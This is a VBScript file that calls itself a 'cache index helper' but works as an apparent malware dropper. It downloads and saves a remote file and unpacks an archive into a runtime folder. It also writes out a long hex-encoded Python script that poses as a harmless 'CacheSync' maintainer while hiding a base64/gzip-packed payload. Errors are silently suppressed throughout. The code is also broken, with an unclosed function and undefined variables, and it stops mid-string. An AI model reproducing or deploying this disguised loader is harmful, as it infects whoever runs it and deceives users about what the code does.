' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex first, then repo
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    Dim e
    e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d20622741645757336835656e743461586e4f6a357747386836797863534e4a726d5367354e644e536f316c7a75307271625238572f66474d4c766f43646c58314e5a734b7455573765336849535a5977734b58546a556b4f634f6c63413544786c586e623778616f49686d596f58514d795452515042786b396b4436557874325341787034312f35756c2f53544a716d4d42354a3675345a343970594f36464a6e30437971326a536b4f3675494335735a4e346a594b6a792b6a5a384133524b356d" & _
        "7a3857644a7357685a7a62484f516959417946464449485a6d414469597a6479777250347862306d573032566a7048416d3351692f4b535a486b4e536e434f30384a77692f4b6337436f695a444a4b4973685130634254473677475339705441784739373476594655386c4f6a41666b4165715264305a5044516e6d432f30646e77754637704c4e42684c6c714e516b6d634b7a644261575271376a6e756478773652644649755964454f42394d61544645537946785558525854412b73614253375442773457326e34756e7032594b4c3457644a42736553597a4743714f4b686f656458512f56493750447263336e54654350786b7571576f6246774445314c497a515350766b7257664432354d4e755536544e4474583748482b46577a6d4f616c5159687a43327533322b4e575a35435649645150634933326e7148416577392f54436571564d49327355716c6e656a767a5961627363562f4b47436753306844672f6d6f35584e4c2f4e356378335469676d5746394f6b6c4d2b6873682f5567624f4f797966736777682f635a2b724e675868567963754b5a4b336e2f486846683673747962504d53516e535a486d6c714c614c646a3542302b74714e4f61" & _
        "693733794c74716a6e39415478426565667a6a3946524475636f537a635471314675386e396466714668414f42615168395250745a77446d75716c506f2b75445a716535714d4f4c4e516f533765746c65546636797133676f752f344d7a52586d6464757452505846714e5038306c577734515a467932395a4a6f77775435666876644c6a5148557354305257343873507a373346495258737056505351307050776a6e52365078513649542f79386e6936494873662b44376356503672305554712f447a4d506c7970594c515975586b447169704a6159392b326b687457724a4c616e61355a73384a345237325373306f6e35384b7535645857746b72574c6a34436b38354e666b592b45442f7949323057336370734e746e77333061614a42773555726771694a686b555a7964534449646634755574747841746b716844484e656139516932614732653177634c6a507754675956724c364774696149506f2b627753704f5737725154496a6f75673935374a43576a6a52456e4c6e38414d2b4e394a796b7570544f5559726439776568566936714143432b315a693346332b64744a2f74684f6c77767369396a356d393263624c4a6c314b6d30796166645a" & _
        "68436c6c6347566a66574e783845704a33495478706c314a585557354d5a5636333877764350476f514c4136324a4f5432676b38356c393868464e7a6a66337150567639507256635869764e6a56764e303048305a57703756447459776b6769756b363957646d2f626f306e4432796946436a7a58714a59485868426b57756f626a6e583833467163654c5164354261307672665152514a372f6a5a6b6e506e713036544a483477767974773871665936312f58386959656833677a334b4e52627842703461393438464256556643492b6d3135422b76355144466c5537494436663373462f35614657455479724d67766a372f686d356b4b53694c39534f32433932552b4c78436353426a776e42576b465274797145634f51384a49473264633071744358397149475066795663544769534a4c524a3169567069326364554b7a4b392f6139674641643371304653364866714d7a70556f2f513742444166385a7a7877796b4d33436f6f4b52694247686a554158667747556c6f4f6c524c584e696a566c4f623533715434765632535872522f4b4d4b535879794b6c4f345a5a357a415075476b466f544178774b414d583844387738394531724d7357763459" & _
        "7a733057557a57386a73456641472f41337061307073434a4a652f75766a2f304834502f7a7a57376f65553050666e614b7579307572663251426473525352502b65555849514f31574266706d5346776570624c4c6c56677a77664a446b76612f69414434364d357161386235534530684a6d6e6c39396d665a76574c543846332b2b736d687a7a754e446b3259765933703268562b4d47796934776a47466a427778387659354f42575253427a467975566641353268663457363439536f64512b754b56524f706a7a38736c30426e4872744370594e486a37344a4e30454b69487945585079614350796e2f2f4b5a4e6f79585346614355355748466a5765705256666e5579364b426b3770362b3337764a434739486c7664465263305041594f347161426e694848704b434832776e494e5176382f6a636756723451413558496c5a314d7831514d5a3966566b4c7667792b51723077575341657a6e6d726574694953644974594a41387849786365494835614678696f544361344a6a4664752f4b52554a3469586f364541464a516e446545764435576349392b5a594f373472362b6431496141307171664830394649633244684676765971364d46656369" & _
        "674e7a45513050684c51436441414f6e4278414f44593345743050726e697748724b5a6c424c3348516f47496e4134507442624672342b75727a3264786755537a637a2f667433367361444d4155455459532b6644775a49445737452b694d6577536e5471737649352f2b34733762517164324373726334467932534a2b4e2b6a364a7a3775414f456159436a3567636f7a6b44304b43424163796e3177327542736646307061506968596c6f6b49453035556d4c794f666e7066656934686f72797556396e74736a4d594d44412f6935524335616655522b77694478716d35496672336c67486c4e6e5130386e374d6b50576e6b4b7a4f6e5338444c354c3030625a5139784f7234766874626365577a564242563753794473417431565958316f7a50342f454b7a3648474242597351615979785953536a5959417742766d545978565839637a467432526a43447a6c5546745041617068387a592b4b582b782b417245346149706f4973725254576a64617468757346464f663564482f66676f584e4c7164425765446b4a53326535334f4748696d686f676264674f7259566157565a7a6353726e4b5864416f486a626d4f59705754486f34463131354c6a73" & _
        "566e71736d4a4d31414a7766314b6e64747a72515458617365672b715548524e694c6e46524d41697744756762472b594e7a7057454878626f466659394f3755576d3373416e313250334a334a4c5650524232755a797135414b42774f687773366c684d65694e4f7764314a5a58492f3546783850497a33474c44667347775041336a4c432b7062412b6a4136667979434e4536656d752f38474f6f576e3030365270716e79513948464a4b7246707639544e345a566e7565465a5a6357694d53444744326e35346b6e72554e4531796843445475416b2f7a4252344d4c7a6f4931427742455174616f79645033415a435269367355646f782f37794a6e6c673032416b58576d554b4d386f653375517164526939316e6458524a375175437078334438316741475450447a65455965556b7962546b396e52527a572f59355347567472576179554949356f586b69455748494478736842356d4c5a3747567751717631794434342f766f646f486346636a2f4b42386c656237634f3835776153466d61586268697a3243615a307355526d3051453033443672737938497a457a2f616744566f2b6b64647a6f596375547a62734b766a74584f38424d754f635532" & _
        "393764706859636d6733476b4c38502f37584f4373493534714a6f48716757702f7659454e6e6a71346c37313056395045684f4251666c5344586b3159412b723877654f43442b49334d7965566272417a643130685562754c4f3742582b4c6d2f73496e506b54552f6b6a624869304b472b4f386e2b446b4964486c566b61516677386f44766c4a305178345a745669426c6c6f386f656d776d764d665955735131704948443142466367325a65554e47785872525a4d33354f3433594b786b3972686f41613768734d63514d615554696d2b55753146506d3875776b344d7a7674624a4f6b544d763530503445782b71762b7a724d456c4f6e2f5262596a4769467157664254666c2b4b7a795a4c46555954582f3069512b6863494947546573334f674f4551733448537858592b5a6c7032474149584a574b753848397145385a43396a656d4d76576f687968664658682b35334566437a5942676958435078664c47497668572f5954336b524f39415259656f4c584356706f437234504470475253344f5449466c3747622b4542426e724443794855685962456d4c644e6d7439716a466250436b68686565647675304a7a6e53624d4132717835366f57614a" & _
        "446b36736b6c48566b50594a39627a46716d2f54583243535849306d4450516f4255465374545a6a536f44763556782b302b62776c4362373964305a454a4347327150354149567071564664316e4f5a5536522b3647372b4237434c5733574b5165534d663876533672626c794e384a69355872305a3071656b4261674b537373743675526c556f414d5a5931586e73334d576d4d777a53696731762f4b30706642693964456a48766951422b6a36595241623048494b5136393967776467754361586f56426a484f577959327344684c4150565a7737665a6d676b5742627076357937525771384f51354b3348694b71763442613664786f326a315242674b61656c736868765761792f612f5a51424c5946764d3244443762776942704b314668667377397a67356f694336436b33394962664a6f6545614d614173614e3255596a6c38386f58657344716641686b632b796e43433576632b3931736779712f436741717957615047617971424868304745336b6d33795a413750617a58526e2f362f47554a7938534a765343325941346a3874687279467970524748326f42454d6f30564d4178536c4c7355463165764e6330533377333442364d663948574e" & _
        "3732443341554d4570532b5a5a764374616746646a705265415953447463742f436130777073792f41363778695970634567686b7638505a4957436f55694769702f735037415332354830616775624568726263564a79537255434241495171377965315a526f59316f34646176546d706b39385350546259346c666e7542496d36747835714e41427641487649324a6e6b435a6968704f7977496e30573644504c4a7839766f4170647070764e5077414d324d513874753262684745595859485236302f713667464c2b654b673941366a55757737464763496f726b6d2b4f6d35376c7050365734336c796e3453617a34305346465741356b6d694464496b6154785167694a44645168345a326d314933324c4b50743061345048674832636a4d57467874674859626444466e41307736613136592b2b37314d494956344938346c54332f474b4545424f464b4567634971435a752f4e6c6542477a2f566177327a79784c78743877574e5734454473674e5a522b307563787669322f66782b3050547635386a2b5943666f70756b787957374732575533794c4b793561427135506e6c63392b54566a4f4a4f534b6f70516c4a417142684a652b52324d724939" & _
        "644f4a626f587754306544494f5647515146485938313152625a677057774b394c58677457346b514344694f306f30715147514b50524a6638545478556733415062795a72437671454a6f76776c705159415144656856654733413330332f62677a7446334763467853594c544f783350656b707865357551475744535063676e4241583832624e67774873796c7838686b724545426a4d654c3232517444594f34346f35417261724642534c4e74794f6432676144714d616f6842695651732f584669766e37493350496c4457742f7537686f2b75693748332b416f5a4a524c50743264457051794437486555684c416231774d676b5a43644c4336486b3949524a4f516d524b78576a6a5930324c5a3168416f66444265566739535544493475773858534435336c6a61484643364b6d346347395043502f6d3759554c3449644c71396e31526a6e7a6f364e7a34314e74394d5656544533517532426477625261435053702b724f6a342f797a343770384b7655334b2b6764303363444b706f5849622f41347a396a685738667a66316d774a3652367a4f7543514142516764334c4d4857614151547471736d2f4f5634454530317a696c5270487441696642" & _
        "7843514745597857567942677235395651302b756c4e6b31772f614333687976424b433079576264687635447779363044593069686d75725868505775774f413071314278705a3252766b457944534731482b446162484a4934384a6d78716b7532554a784f56727072314e7047524e66692b564b4e453345344452393969666a614853426e7739684961446c352b697473664f6c45516e424a67475970726b6376744f515a61584e7856586b39786844346435676a6b324b2f736d686247466c6134557877614c307156322f3053432b68794235343661695a2b5775454a427938546f527a544c2f5a755143534b5a42766d4757467164647176627a714f73394d2b5a676b3247526f347530345a3041616648684b754774593357695077646c694c632f59526a58693865522b6c6a6c6a75676a4579533241626d3674695067733242484a3046524670684234385878425a716457344c50466e594c335741507738366b50677956747346316145693541356d2f7061737a6869474d4a62524c69504d50357a676a64457535334d562b51552b465a556e746850447a4d4e4530594f4954634976334b6945714a4950454f36517434447670554768764366757066" & _
        "2b5178526d4573516b726759593958534a4d4579636b5a6a6c73745941666c79624e6c4438445a744652675075776445334536586367524f516c4c6a6d6c6a434e7851636852676c6559345978756149543636367774677a4b5076364342744e4d64355a6556736b38307657587142452b4f56783453524f7547553433777a6d5857373265454854334e5a7571564f39617335654257627a422f784b634e2f48346c6252323166412b6b6c43554d4d763658727761436d392f4b526458706443654f566744642f3864676a374662424c425036446272742b6746566854476c6b6156354c4a6e325050466c514b2f706b4436397153504d7367717938707467414277674837702f484f3749736848354d6c32586f2f723366756f6b444c386761514f386b4b593575496c42616f71527673756f364a43327337487077384e395347643838796a6a6c314f62316b30715466352f635348484365696b3458792f63644942504358666f4a73337434756e63487175487a56426d58736f347269466135506d42446578736c49374e356439392b326f3369673237354e366f62775a45417a6f4a61483236596d54394d564d6e794876476258684a4f6938496d4562494c74" & _
        "456272414b6c4636457034417a3247705361696857732b336b4a32546e395a4945444d6c594a3343446c6e472b4a73625a4b39626b786e6931544f433361452b734d7a596242565337334f504375696c7831376e584364336f41526541755871314b2f6a2f584b657959344276463467304d397541412f356867424671527341694e64463179356c555362514e4b417533355146375a7a4f5067697a7a346f366a797957683941336471424e4c465a6b315051306e42584b695077644172786b42674749746d7377474a64676a6759314a514f56496e324f6266726d2b735a6e7251796652463858315a59625132596e4e794d7667766a7974334f6a323277503044667052796f4965634f7053773457375a724c35425a354a34764679645a307a52614567344c6946456f4c63524c6b79334737687a6e5a5a356a547576593678416c454f32514d44517575645957456f474b4f59335769567a6c46733057447a7a4458493545576a387673644539744466454b456f667378536e454267577331394d46446f787138383832704759374c424b4673352b327352494d6c3569666c36686549445145554d584e396d4f586f535267676b446c6f52796d33594763756d" & _
        "666c36746266676f694b676679786443544b59396148396d415171345547735a72537a346e5146627758676f4d6454636c36344b71487a5a54586e3136556c5847727575584a5a4d4b723170476a6b396f46446972324674454d65305070316d556b61395a4d443776485838616a6c536e462b41546f787a79303439393866557441694c78477343654e56456347713547324957785570432f416469304e66465475654d6d7333466d6941714b6a6f59534c2b417775726a4a4f50462b334334677356737571375875386a4964766854354133614352616b694b6a415532694d456952647343654175305a59366e6d755746644c313341327a766c4b463872456264716f4e776f50754977473744522f416b35373356576f4c6d7843613831715842745236534b494252457a4a76744c4a5835684b492b6a34775a6a785a3563375651634c2f784a51455254534469354a337a6d2b4f6d536e41756a37314c4a6c757178686e6d594468454e415a6c44734b68616850332f3264787767534a616c48326453776b6935685451373055584e685138434744304434312f4f48692f6277524c565779555a5a77593636543431587a30582f4f31705073416c336b736567" & _
        "6565325948543659534a6c6339346c5376514d52424e346752504a596b47376f49425368706e524b766b466b736c48684e6474557769762f3933575233517369513670777971526b5930326a4e396669735332615569614e726c6b713832765879626c6d513438772f3742487538384b467336655431723961566d7a484455754f35682f7a3864415855676f36754c5a66774268586b364857486c35386e327849314e742b326356705439642b463939574b6937624a4f7765314a687a5276367846557a77747352646877374d497231764649366f375a566f70776f6665457236416c59415a5555464d79657031367a417a6c7836444d454f503067615565662f5731624d394876517648366d2b3150317853797267555134534a5a634544715a5a6f52736630494c325a37616c554e4e32544a382b6a4c2f3853454e6a2f6353776d34626c32692b326a6e5742366154493261577a68374d566e4439556262437a354c59335053363178494b583739477772694b584443612b5546474c4445425a39786f65686348516d543462434b47647661454e566d48686f49552f736c61574136486e796f6c2f6b7562444949784f69424b4f7374647671684d364261546a" & _
        "637055436f79652b366c61305a62655a6d39574461693630566a4d357670684539384e4a6a6b5156553574506b2b334c4d47533049782f516c67646a4938536c3454616e42594b376962566a357234584a694d4f716f7346443176757465336374645256677a613333725a4e7949566664497166586745516e33615145614d534e6138543870797a53715473676e50616157574857776e34305036672f6339324653697a386545556a676b4d766473467342506350615172376a56473249536b4573504a6938556a562f4b70445338386c796b3048792f46746245442f4a5277365a64736b2f503664322b57736b63416f686a573244526c797869446c706338723941504745524c54695641734e36797275587570626368596853734d38424268334d5657744d6f69614c57543579534e4d7172356f33716c6130334b6b6e307938537833564f676a727468307a7a654e653966752f4476766449617a7961597464757248737055447273796f6f6e4277364e754730736f4d6130696c7477482f7a2f657542613934455744666f3336724c37715874516136396d33636f3350674a54324254346c566a3267446f4f42394c33554c524d35785558653279636a5472" & _
        "6c3175504e716e3537536b5a437a437133722f4b2b64524c595673386145362b7a704c72694838354874422b4c63343835436478777a6943307955634e766b5979337a354751726f36374c67427565615866452f354b517576476931464734374431335a37386a724e4838744c374d4b486974644f615a306979553831584d374b66452b456d792b33727363794f7476494454616370746652616c7933307067766a433055657658435a33596458592f6e2f6843706e7442734370662f697470476c657936494967483131345341707970474c664767702f4e6e61745836624f585147794d586c73646c74495030476f4f54736a4c386c544f5a52535831734a4a613453517a4a6c646d3732386276446b35565658387667617345746a43506a4e336d773062386c2b456b397243497a7058386d4f356c4f6976344d4d4e334a3868683344756f65457239734f666e5a4353357349784754623067634d656351646a4d3043485554314b46635769716d466b76412f624a6b5838756652453077646c487a344d674d7a5639307978414a7975472f7a772f71694c79524f775653794e78373668667053313166556351372b43357449725952486a566f334e3351384f" & _
        "4259346b67682b3355784e687a46466a4e7979353555627a3346736e717864753847582f376a75756c7234457670644e352b6256504c7469736c4c52682f4b5178314d435934573971326f647a6e2b4a484b667a7554387379523256657a514f665663384a36533767616179664e30347179386864742b69514e4f747a6e49677667774e72676649354a2f53772f64517271614f6e782b37554942643463446532676251696d56427a444b613944795355434b6546656b6b443878317a6a61504238654879635750685172652f64713870627372357a427333656f304c722b5647437a545267485530794853667152624e6776393143502b716373432b49345667437448496a4d6670445479376f4854307955692f6a6b76785a753043336d566855693258586a7241794f4279624f7946436f764a41326d5970576a5044373063426b57503765707a572b563942734d39576f6e6f423648575736584e71667a6b6974477743416a48564853676e546e544f5572356551322f30693235345433575045316c4548595161684e5939465650385a31777a327531584244754c4d36585833617754566f632f7634664a6f4f4c6d68396570447638744657542f696e4277" & _
        "747a725a2b30746846524f6a474f4b36325634486f793461586b416763666b685146552b544c31663448686e4e7542554d2f454936433234362f4e7152453775393076744f7867504735346b4c4631636b4c686455317762626b7251634633512b76422f4e69395a6b4e70547a566b68566f6772613145565a4c436461437a59792b7042437a4e776d6a764e464d396d7747516e47676b5264582b76356273672b624165726974694f2f62732f76483051516166323177796a564d376e3763485431544a447553454a70354a666a4a514c794238596c6a5a57374b6758446638784544564f49646d346e502b484e494f44534c4679634e44395564427243357749356c6938597133376b465275724a42556e356b55412b69567a36454e71323738573572482f4f6b3738595364756b7a356f65336546316c746b6c614742434a483075792b372f7866462b77306178636436536454494c4b31617562486366643932773449766f39474e6a31796e352f4847344934304254545646567364666150326a7833693332322f786c7a617565366f456774764255306a796a6b4c4a714d456463666e3858336e68745831723061303164587163702f6336446c76485a6b75" & _
        "35756b472b5738325664507248665850793434726f71374c6e6f576d514a4773676d475441657954695445796934712b626e484c6f4e382f63394b6e784d6e456a39416d6e657949724e5a613869535166706d6d743239524b336d594a372f392f36646d4570466a767579743542782f6a6859505a6c64422f64542f58585a7844362f664f3035657146674f67385a2f55444e68356b7a6e6c315846717875627a72304d4858762f563835692f613547675a43306e2f634a6f664a72646e506a78556d6b2f3232796f6377573348624f49455261543674567453386c784b76506f5132724d63486678722f534e55646e513859316b496b6b74726e623144535375383859323361703163664d4f5337575241473741715577745366597571443635364b706a7166595a56367763724e744f612b684d5946366a3048764c4a304b686a54706437417448527147774d343335792b78723056505a704e4245674244333957735655694a6678317431455a383644552f5678652b667158636757494d554c61413468394c65545979665933423477734835315166347653433166546c316a524c73744f377279642b4f32562b6e49355034792f574b587549417739656c6a" & _
        "316b4d47456e5246555568494b4451766a302b2f742b42497752334b7255457354687a46454f50375879354b54396e6b5550762b646341557257464b39596975584758755358574c4a456659446a724a7a6f4259375175684b5734377177433474366f4b4954647763547858506b44472b333579485734647373427243324d5834704e32642b77517a4a6d45507668374d646e616d6c70596e6c732b734b6c536d3970753846717979744d65536d527a37724e6b423069495873494149357a64674556307a4f583450456c44737169744574572f65422f512b6c59423854684d4e796744366a507564325043737039722f6962554c5258663845514d44477559574351774d504652665053512b5441775464654938374e757165723750796f48374c514465543363507374796b4f4a2f624733422f717374364859683253495a6c785970566839336e4d56334d55656433712f4838467261504d5059763367554f3152683265386933546745442b337a5a2b576447644c623679432f68697459336c3331553868786b4c46574550473876685a4a6e46666839327543486e2f726661576744564b75325163776e6d6f4a777a4977773556727673762f3448684a4970" & _
        "4643773072364b48537759524d7a4d44303448456a46586c53734b5451684c654f32656175765569453846674b744b4e376f416d71686749596a50654d43365a354e4651344c4c6c5376656c5a4478356d615544342b6c434d577a346333384f6c6a42597430647a39344353767a572b6235464f31654770706f397355584b4d765964495a44464f3462506a55664578744b534d306f2f4e3576734d6b35466672545578397130626a37744a7235463945536545635350496b6874486839734c7531366c706e35666a56306d6a375a6f2f4a7269636f4e6e58514933414856724c4e6545664a484e6c59343247593070376846667939345448664f6759304f6c775948624b526f6578363439484a56516675696232636d7244794f616364437967513077693437616b61486e595355543864514775544e754e57524167793052754a334e64646d414162456852746c394542444f504f7a462b7744544f71434445624b644a68744f76694e574a767934547a5a4f34544b376f736e686e4b442b70534157512b3736454b437a745969304a63516e786334557a4d5850424b33744a4749317551747077766237394e3746797a55764d76726d2b4f5532387336336f2b" & _
